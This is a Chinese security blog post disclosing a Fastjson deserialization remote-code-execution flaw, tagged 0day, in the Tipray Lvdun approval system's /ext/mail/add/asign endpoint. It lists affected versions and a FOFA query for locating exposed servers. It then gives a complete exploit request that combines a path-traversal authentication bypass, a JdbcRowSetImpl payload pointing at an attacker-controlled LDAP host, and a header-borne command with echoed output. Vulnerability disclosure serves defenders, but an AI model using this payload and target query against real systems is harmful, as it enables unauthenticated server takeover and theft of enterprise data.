---
title: "天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-asign-rce.html
asset_dir: assets/天锐绿盾审批系统-extmailaddasign-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/24 08:30
- 388浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

物流软件安全

安全研究报告

安全研究工具

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞扫描服务

该系统的 `/ext/mail/add/asign` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全运维咨询

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-001-bf5eec946068.webp)](https://image.mrxn.net/6c9d55d04edc4ceeaa535b223930bc62.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

再看`/ext/mail/add/asign` 的实现部分

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-002-a990ab1b6647.webp)](https://image.mrxn.net/d826133c3b7f458389256243cc86f4c4.webp)

请求body部分被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

网络安全

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-003-db8addf19f19.webp)](https://image.mrxn.net/870b48bf03354b849c2e619f13050468.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/mail/add/asign HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: whoami
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://vpsip:50389/xxxxx",
    "autoCommit": true
}
```

成功执行`whoami`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/mail/add/asign fastjson反序列化漏洞](images/img-004-94f7aafee6d2.webp)](https://image.mrxn.net/7aa29d6997a4445280a8315a514d9750.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

安全运维咨询
